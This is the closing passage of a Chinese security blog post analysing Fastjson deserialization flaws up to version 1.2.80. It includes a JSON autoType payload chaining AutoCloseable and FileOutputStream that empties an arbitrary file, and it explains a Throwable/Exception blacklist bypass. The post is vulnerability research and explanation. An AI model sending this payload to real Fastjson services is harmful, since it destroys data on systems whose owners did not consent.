<p>a) 只要dst存在，PoC就会往src写数据，与src是否存在无关。<br>b) dst不存在、src存在时，先”mv src dst”，再往src写数据。<br>c) dst、src都不存在时才会往dst写数据。</p>
</li>
</ul>
<h5 id="清空文件"><a href="#清空文件" class="headerlink" title="清空文件"></a>清空文件</h5><h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.io.FileOutputStream"</span><span class="token punctuation">,</span>
    <span class="token property">"file"</span><span class="token operator">:</span><span class="token string">"/tmp/nonexist"</span><span class="token punctuation">,</span>
    <span class="token property">"append"</span><span class="token operator">:</span><span class="token boolean">false</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>条件</li>
</ul>
<p>需要通过<code>ASMUtils.lookupParameterNames()</code>即需要保留有调试信息</p>
<ul>
<li>分析</li>
</ul>
<p>这里就是指定了一个路径的输出流，且设定为覆盖模式，且没有写入数据，导致清空文件内容</p>
<p>同样<code>java.io.FileWriter</code>也可以达到目的</p>
<h2 id="fastjson-lt-1-2-80"><a href="#fastjson-lt-1-2-80" class="headerlink" title="fastjson &lt;= 1.2.80"></a>fastjson &lt;= 1.2.80</h2><h3 id="对上个版本的修复-1"><a href="#对上个版本的修复-1" class="headerlink" title="对上个版本的修复"></a>对上个版本的修复</h3><p>将期望类<code>java.lang.AutoCloseable</code>加入了黑名单</p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>但是除了<code>AutoCloseable</code>可以进行绕过，<code>Throwable</code>也可以进行绕过，简单分析一下</p>
<p>主要是找到一个<code>Deserializer</code>可以将<code>expressClass</code>作为<code>checkAutoType</code>的参数，且能够突破expressClass的限制，正如这里的<code>ThrowableDeserializer#deserialze</code>中存在</p>
<p><img src="image-20220715153852730.png" alt="image-20220715153852730" loading="lazy"></p>
<p>这里限制了必须为<code>Throwable</code>类或子类，存在一个<code>java.lang.Exception</code>类，不仅在<code>TypeUtils.mappings</code>中存在，而且没有在黑名单中</p>
<p><img src="image-20220715154922130.png" alt="image-20220715154922130" loading="lazy"></p>
<p>所以只需要找到继承<code>java.lang.Exception</code>的类，就能够绕过检查</p>
<p>跟进代码，在第一次进入<code>checkAutoType</code>中的时候expectClass为null,</p>
<p><img src="image-20220715155238368.png" alt="image-20220715155238368" loading="lazy"></p>
<p>一直跟进到这里尝试从mappings中获取缓存</p>
<p><img src="image-20220715155820846.png" alt="image-20220715155820846" loading="lazy"></p>
<p>之后在<code>ParserConfig#getDeserializer</code>通过clazz获取到了反序列化器为<code>ThrowableDeserializer</code></p>
<p><img src="image-20220715160125578.png" alt="image-20220715160125578" loading="lazy"></p>
<p>之后调用其<code>derserialize</code>方法，跟进</p>
<p><img src="image-20220715160305785.png" alt="image-20220715160305785" loading="lazy"></p>
<p>之后在这里获取下一个<code>@type</code></p>
<p><img src="image-20220715160439043.png" alt="image-20220715160439043" loading="lazy"></p>
<p>最后在这里将<code>java.lang.Exception</code>类作为<code>expressClass</code>传入</p>
<p>也能够成功绕过黑名单的检验</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/kjttmJHtBiuYHItdmVTEIA?notreplace=true">Fastjson v1.2.80 Throwable AutoType 机制绕过漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&mid=2247484413&idx=1&sn=1e6e6dc310896678a64807ee003c4965&scene=21#wechat_redirect">寻找Fastjson 1.2.68 AutoCloseable利用链(3) (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://b1ue.cn/archives/506.html">fastjson 读文件 gadget 的利用场景扩展 - 浅蓝 ‘s blog (b1ue.cn)</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析 (qq.com)</a></p>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="Donate" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/B01E5F9A0F70645FFD7D980FB6243619.jpg"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/B01E5F9A0F70645FFD7D980FB6243619.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/D4AD9FA7BDA95604D2919F414577B0BA.png"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/D4AD9FA7BDA95604D2919F414577B0BA.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/E8775427D2C8BC65C9AC73AE4CE5A3D8.jpg"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/E8775427D2C8BC65C9AC73AE4CE5A3D8.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>RoboTerh</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/" title="Fastjson反序列化漏洞2">https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul><script>document.addEventListener('copy', function (event) {
  const clipboardData = event.clipboardData || window.clipboardData;
  if (!clipboardData) { return; }
  const text = window.getSelection().toString();
  if (text) {
    event.preventDefault();
    clipboardData.setData('text/plain', text + '\n\nPost author: RoboTerh\nPost link: https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/\nCopyright Notice: All articles in this blog are licensed under CC BY-NC-SA 4.0 unless otherwise stated.');
  }
});</script></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2022/04/03/Fastjson%E5%86%85%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE/" rel="prev" title="Fastjson内网利用链"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">Fastjson内网利用链</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2022/03/28/DASCTF-X-SU-%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="next" title="DASCTF X SU 三月春季挑战赛复现"><span class="post-nav-text">DASCTF X SU 三月春季挑战赛复现</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> RoboTerh</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.7.0</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>